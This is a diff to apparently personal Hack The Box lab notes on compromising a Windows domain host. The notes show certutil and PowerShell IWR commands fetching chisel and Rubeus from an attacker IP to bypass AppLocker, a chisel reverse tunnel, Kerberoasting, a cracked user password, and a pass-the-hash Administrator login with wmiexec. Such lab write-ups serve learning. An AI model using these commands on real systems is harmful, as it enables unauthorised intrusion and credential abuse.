@@ -65,9 +65,10 @@ evil-winrm -i 10.129.230.198 -S -c enox.cer -k enox.key
 
 # Foothold
 ### Lateral movement amanda -> mrlky
+```
 *Evil-WinRM* PS C:\Users\amanda\Desktop> dir
 *Evil-WinRM* PS C:\Users\amanda\Desktop> netstat -ap tcp
-
+```
 ### Kerberoasting as port 88 didn't show up in nmap
 ##### domain htb.local from nmap scan
 ```bash
@@ -77,7 +78,7 @@ it failed as it requires the pivoting first.
 ### Blocked
 `certutil -urlcache -f http://10.10.16.9/chisel chisel`
 
-### Bypass AppBlocker
+### Bypass AppBlocker with `IWR`
 ```bash
 IWR http://10.10.16.9/chisel -OutFile chisel.exe
 chisel server -p 8008 --reverse
@@ -85,15 +86,14 @@ chisel server -p 8008 --reverse
 ```
 
 ### Try it from windows with mimikatz, powerview or Rubeus
-evil-winrm upload failed
+`evil-winrm` upload failed just like `certutil`
 ```
 *Evil-WinRM* PS C:\windows\temp> upload /home/alvin/Downloads/Binaries/Rubeus.exe 
 Info: Uploading /home/alvin/Downloads/Binaries/Rubeus.exe to C:\windows\temp\Rubeus.exe
 ```
-
-Try IWR insteadchisel
-`IWR http://10.10.16.13/Rubeus.exe -OutFile Rubeus.exe`
+```
 *Evil-WinRM* PS C:\Users\amanda> IWR http://10.10.16.13/Rubeus.exe -OutFile Rubeus.exe
+```
 
 ##### Rubeus with creds
 ```
@@ -113,7 +113,6 @@ Program 'Rubeus.exe' failed to run: This program is blocked by group policy.
 mrlky:Football#7
 
 ##### Sign csr for mrlky again
-Football#7
 ```bash
 openssl req -newkey rsa:2048 -nodes -keyout mrlky.key -out mrlky.csr
 
@@ -152,6 +151,5 @@ Impacket psexec.py should work, but it doesn't.
 
 ##### Root
 ```bash
-evil-winrm -i $IP -u Administrator -H f6b7160bfc91823792e0ac3a162c9267
 python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes :f6b7160bfc91823792e0ac3a162c9267 Administrator@$IP
 ```
